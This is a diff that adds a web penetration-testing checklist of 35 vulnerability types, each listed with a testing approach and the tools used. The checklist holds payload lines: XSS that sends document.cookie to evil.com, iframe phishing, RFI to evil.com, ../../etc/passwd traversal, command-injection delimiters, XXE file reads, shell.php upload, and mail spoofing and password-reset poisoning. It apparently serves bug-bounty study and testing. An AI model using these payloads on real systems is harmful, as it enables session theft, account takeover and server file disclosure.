@@ -1,0 +1,312 @@
+S.No	Vulnerability Name	Approach	Tool Used
+1	Privilege escalation	
+Horizontal (admin-admin & user to user)/Vertical Privilege escalaiton (User-admin)	burpsuite
+2	Privacy settings bugs		burpsuite
+3	 Session bugs 	"Check if session tokens/access tokens on
+-Expires on logout
+-password reset/change
+-expires on user removal
+-expires on changing roles 
+- insufficient session fixation - cookie editor extension used"	burpsuite
+4	Insecure CORS misconfiguration
+"curl command to detect: curl http://site.com -H ""Origin:http://evil.com"" -I
+if it is access-allow-origin:* - not exploitable
+origin: evil.com
+origin: site.evil.com
+origin: null
+if any site disclosing usernames & password, try cors exploit."	Corsy/burpsuite
+5	CSRF
+"intercepting the victim request & generating csrf poc & sent to server as a attacker
+- CSRF can be get or post based
+- try in all state changing requests
+use:  jsfiddle.net online tool
+check it validates orgin/referer if not csrf possible
+check it is cookie based authentication
+if anticsrf tokens are there,,
+1) remove anticsrf tokens & parameter
+2) pass blank paramter
+3) add similar length token
+4) add another userss valid anti csrf token
+5) random token in long length (aaaaaaaaa) 
+if content-type verfication
+1) if no anitcsrf tokens are there
+2) try content-type=text/plain
+flash csrf
+check if any crossdomain policy 
+use swf json tool"	jsfiddle.net/burpsuite
+6	XSS 
+"1) inputvalue(try payload like '""batman()<>) reflected without xss protection 
+2) xss validator - Intruder
+3) host header injection through xss
+add referer: batman 
+hostheader: bing.com"">script>alert(document.domain)</script><""
+4) URL redirection through xss
+document.location.href=""http://evil.com""
+5) phishing through xss - iframe injection
+<iframe src=""http://evil.com"" height=""100"" width=""100""></iframe>
+6) Cookie stealing through xss
+document.location.href=""http://evil.com/p/?page=""+document.cookie
+7)  file upload  through xss
+upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
+8)  remote file inclusion (RFI) through xss
+php?=http://brutelogic.com.br/poc.svg - xsspayload
+9) convert self xss to reflected one
+copy response in a file.html -> it will work
+10) xss through uri parameters 
+site.com/about/xss""><script>"	xss validator/burpsuite
+
+7	Host header injection
+"1)  url redirection through host header   (check url having 2xx, 3xx)
+real host to bing.com
+X-forwarded-host: realweb.com
+X-forwarded-host: bing.com
+2)  webcache poisoning through HHI
+injection will be reflected in any buttons of page
+3) host header attack on password reset page 
+4) xss through HHI"	burpsuite
+
+8	 URL redirection or open redirect 
+"1) common parameter list: dest, redirect, uri, path, continue, url, window, to, out, view, dir, show, navigation,
+open, u, file, val, validate, domain, callback, return, page, feed, host, port, next, data, reference, site,
+html
+2) site.com/bing.com, site.com//bing.com, site.com/payloads"	burpsuite
+
+9	parameter tampering	 ecommerce websites	burpsuite
+
+10	HTML injection	
+"1) get or post method
+2) input value reflecting back 
+3) <h1>adam</h1>
+4) url direction via html injection"	burpsuite
+
+11	File inclusion	"1) LFI & RFI 
+2) LFI
+any.com/index.php?reference=login.php
+3) RFI
+any.com/?share=http://evil.com/  
+common parameter look on 
+file, document, folder, root, path, pg, style, pdf, template, php_path, doc
+dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain, 
+callback, return, page, feed, port, host, to, out, view, dir, show, navigation, open
+4)  lfi - /var/www/html/ & /etc/passwd
+../../etc/passwd"	lfisuite tool from github
+
+12	Missing spf, dmarc records	"detecting - mxtoolbox.com
+"	" anonymousmail.me
+ https://emkei.cz/"
+ 
+13	 SSRF
+"1) making request from vulnereable application to target website
+2) common paramters to look on
+dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain, callback,
+return, page, view, dir, show, file, document, folder, root, path, pg, style, pdf, template, php_path, doc, feed, host,
+port, to, out, navigation, open, result.
+3) detection using https://www.expressvpn.com/what-is-my-ip & burp collabator also used
+4) any.com/index/php?uri=http://external.com
+ exploitation of ssrf (read file from server, scan the internal network, ssrf wih rfi)
+5) read file from server - file:///identf- intruder on identifier- use lfi payloads
+6) scan the internal network - http://localhost:1 (changing the port number topcommonports like 21,22 etc) 
+7) ssrf with rfi - exceuting code from the external domain like (use hackoff.html with xss script)"	burpcollabator/https://www.expressvpn.com/what-is-my-ip
+
+14	Critical file found & Source code disclosure
+"1) using https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content payloads
+2) use dirsearch "	burpsuite
+
+15	subdomain takeover	
+"1) if the website is not used by the target which is laying in any service provider.
+signingup on service provider like github, heroku, shopify, zendesk, aws, tumblr etc to takeover domains"	github.com/nahamsec/HostileSubBruteforcer
+
+16	command injection	"
+1) taking input as a command, reflecting output of that command
+2)  common parameters look on
+daemon, host, upload, dir, execute, download, log, ip, cli, cmd, filename, 
+3)  how to find cmdi: using delimiter list (like ;^&, &&, |, ||, %0D, %0A, \n, <)
+4) how to find - find a input field interacting with os shell
+5) try with delimiter & shell commands 
+6) ;dir, ;/etc/passwd
+7) intercept - use clusterbomb- first parameter for delimeter & 2nd for command payloads"	github.com/commixproject/commix.git
+
+17	fileupload vulnerability
+"1) simple file upload - shell.php - fullcontrol of server - run shellcommands
+2) github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images
+3) pixel flood attack
+4) content type verification 
+5) extension verification"	 github.com/almandin/fuxploider
+
+18	XXE Injection	
+"1) inputfiled - use xxe payloads in intruder to detect
+2) check website is accepting - content-type=text/xml header -> 200ok
+3) use online tool called pingb.in - check for external ping
+4) for blind xxe - use python -m SimpleHTTPServer 80 
+5) SYSTEM ""file:///etc/passwd"" for local file read
+6) SYSTEM ""http://systemip/readinganyfile"" - blind xxe
+7) php:// to get RCE 
+8) use Gopher or other URI Handlers to exploit xxe"	"common places to find xxe
+1) xml file uplaod (eg:config files)
+2) xml input fields
+3) xml based apis
+4) xml based files (rss, svg)                Tool: pingb.in/burpsuite"
+
+19	account lockout 
+"1) preventing from bruteforce attack
+2) intercept the login page with usercredentials with burp
+3) sent the request to sequencer
+4) or sent to intruder - make 1000 times request
+5) do credential stuffings
+6) the account needs to lock out for 30minutes to 24hrs"	burpsuite
+
+20	blind xss	
+"1) type of stored xss - attacker input saved in server - saved in database
+2) it wont be reflected 
+3) look for blind xss in pages like ( contact us, log viewers, feedbackpage, chatapp,
+ticket generation app, any app use moderation or updation, saving forms)
+4) online tool used - xsshunter.com
+5) copy the payload & paste it in input field
+6) reflection will be found on xsshunter.com
+7) multiple blind xss using intruder"	burpsuite/Xsshunter.com
+
+21	 Buffer overflow - web
+"1) intercept loginpage - pass long string of passwords or any quanitiy of input things
+the page will load slow
+- types of overflows - buffer, stack, heap, integer, format strin follows
+2) dos using buffer overflow - application dos attack"	burpsuite
+
+22	CMS vulnerability hunting	
+1) wordpress, joomla, drupal, vbulletin, magento                                               
+2) find vulnerable component in the cms                                                                          
+3) Search exploit in google 	wpscan, cmsmap, cmsscan, joomscan, drupwn, vbulletin scanner, mage scanner, owaspVBScan
+
+23	IDOR 
+"scenario - 1
+1) mostly found on user settings or profile management 
+2) two accounts required 
+3) intercept the request - change emailid of attacker
+4) logout
+5) try login with victim account - it wont work
+scenario - 2 - user moderation
+1) find user id 
+2) replace attacker id instead of victim id
+3) do functionality"	Burpsuite
+
+24	Long password dos attack"
+1) password - hashing - process - resource consumption by cpu
+2) same like buffer overflow - but trying only in password field which doesnt have
+password length 
+3) try to signup a account 
+4) give details intercept the request
+5) give password more then the length - forward the request
+6) applicatian dos"	Burpsuite
+
+25	No rate limiting vulnerability - logical flow
+"1) capture forgot password page or even any request into burpsuite
+2) sent to intruder
+3) make 1000 times request
+4) it will affect both user & server "	Burpsuite
+
+26	Password reset poisiong	
+"1) forget password page -> intercept in burpsuite
+2) host header attack
+3) victim will receive emailid from the evilwebsite which mentioned in hostheader"	Burpsuite
+
+27	Broken Access control (Missing function level access control, IDOR, privilege escalation, authorizationbypass, business logic flaws, forceful browsing, parameter manipulation, path traversal, local file include)	
+
+"IDOR"
+Browsing with account 1
+https://acme.com/changepw/id?=1234
+
+you can create a 2nd account and you get assinged
+https://acme.com/changepw/id?=5678
+
+if you completely logout & loginto account #1 and issue the request 
+with the uid from account #2. you may be able to change the 
+accounts password. having to find users guids lower the priority
+a but, but look for other endpoints that might alow you to search 
+for a user's guid                                                                                             
+
+"Hash based IDOR"
+- usedid sometime hased with base64                                                                  Local file inclusion, Path Traversal
+
+GET /view?pg= termsandservices
+
+GET /view?pg=../../../../../etc/passwd%00
+
+"	"Common parameters
+id, user, account, number, order, no, doc, key, email,
+group, profile, edit
+numeric values                                    
+functions lookon
+change email, change password, upgrade/downgrade user role,
+create/remove/update/delete context specific app data
+shipping, invoices and document viewing"
+
+"Missing function level access control 
+forceful browsing
+GET /admin/viewTransactions
+GET /ADMIN/viewTransactions
+
+static files
+GET /patientIMAGES/3216647.jpg
+GET /patientDocuments/21714.pdf
+
+Direction function calling
+POST /admin/viewTransactions.ashx?admin=true&from=08032017&to=08032018
+
+Parameter Manipulation & logic bugs
+giving negative price 
+
+logic flow - ecommerce
+skipping steps on workflows
+additem->checkout->enter shippinginfo->payment"	Burpextension used: authmatrix, authz, autorize & autorepeater
+28	Account takeover via forget password page
+1) Intercept the forget password page                                                                                                                                      2) add X-Forwarded-Host: bing.com                                                                                                                                          3) forward the request  	BurpSuite
+
+29	Broken Access Control	
+1)Create an account. 
+2) Change email id from A to B . 
+3) Now Generate forget password for email A. 
+4) Also try same concept on password also.  	BurpSuite
+
+30	Rate Limiting bypass	
+1) Intercept the forget password page  
+2) Send to intruder 
+3) add X-Forwarded-Host: bing.com 
+4) Target to email 
+3) forward the request 	Burp Suite
+
+31	Lack of Password confirmation 	
+Required to delete account, change emailid, 	Burp Suite
+			
+	Ecommerce bugs to test on 		
+32	Order management flaws
+"1) Price manipulation during order placement
+2) Shipping address manipulation after order placement
+3) Absence of mobile verification for cash-on-delivery orders
+4) Getting cash back/refunds even when the order is canceled
+5) Non-deduction of discounts, even after order cancellation
+6) Using automation techniques to perform illegitimate ticket blocking for a certain period of time
+7) Client-side validation bypass for maximum seat limit on a single order
+8) Bookings/reservations using fake information
+9) Usage of burner (disposable) phones for verification
+"	
+33	Coupon and reward management flaws	"1) Coupon redemption, even after order cancellation
+2) Bypass of a coupon’s terms and conditions
+3) Bypass of a coupon’s validity
+4) Use of multiple coupons for the same transaction
+5) Predictable coupon codes
+6) Failure of a recomputation in coupon value after partial order cancellation
+7) Illegitimate use of coupons with other products"	
+
+34	Payment gateway integration flaws
+"1) Price modification at client-side with zero or negative values
+2) Price modification at client-side with varying price values
+3) Manipulating the contact URL
+4) Bypassing the third-party checksum
+5) Changing the price before the transaction is completed"	
+
+35	Content management system flaws
+"1) Flaws in transaction file management
+2) Unusual activities involving role-based access control (RBAC), which regulates access to computer or network resources
+3) Flaws within the customer notification system
+4) Misuse of rich-text editor functionalities (which edit text within web browsers)
+5) Flaws in third-party application program interfaces (APIs), which are used to create specialized web stores
+6) Flaws in integration with point-of-sale (POS) devices"	
